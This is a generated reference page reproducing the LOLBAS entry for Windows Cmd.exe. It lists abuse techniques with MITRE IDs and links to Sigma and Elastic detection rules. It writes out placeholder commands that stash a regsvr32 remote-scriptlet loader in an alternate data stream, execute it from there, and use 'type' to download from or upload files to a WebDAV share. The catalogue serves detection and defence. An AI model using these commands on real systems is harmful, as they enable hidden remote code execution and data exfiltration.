---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Cmd.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `cmd.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmd.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Cmd.exe](../../tools/windows/cmd.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | cmd.exe |
| name | Cmd.exe |
| type | tool |
| source | lolbas |
| url | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@yeyint_mth'
  Person: r0lan
- Handle: '@mr_0rng'
  Person: Mr.0range
Author: Ye Yint Min Thu Htut
Commands:
- Category: ADS
  Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
  Description: Add content to an Alternate Data Stream (ADS).
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
- Category: ADS
  Command: cmd.exe - < {PATH}:payload.bat
  Description: Execute payload.bat stored in an Alternate Data Stream (ADS).
  MitreID: T1059.003
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
- Category: Download
  Command: type {PATH_SMB} > {PATH_ABSOLUTE}
  Description: Downloads a specified file from a WebDAV server to the target file.
  MitreID: T1105
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Download/copy a file from a WebDAV server
- Category: Upload
  Command: type {PATH_ABSOLUTE} > {PATH_SMB}
  Description: Uploads a specified file to a WebDAV server.
  MitreID: T1048.003
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Usecase: Upload a file to a WebDAV server
Created: 2019-06-26
Description: The command-line interpreter in Windows
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
- Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
- IOC: cmd.exe executing files from alternate data streams.
- IOC: cmd.exe creating/modifying file contents in an alternate data stream.
Full_Path:
- Path: C:\Windows\System32\cmd.exe
- Path: C:\Windows\SysWOW64\cmd.exe
Name: Cmd.exe
Resources:
- Link: https://twitter.com/yeyint_mth/status/1143824979139579904
- Link: https://twitter.com/Mr_0rng/status/1601408154780446721
- Link: https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22
- Link: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmd.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
```

```text
IOC: cmd.exe creating/modifying file contents in an alternate data stream.
```

```text
IOC: cmd.exe executing files from alternate data streams.
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
- Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
- IOC: cmd.exe executing files from alternate data streams.
- IOC: cmd.exe creating/modifying file contents in an alternate data stream.
```
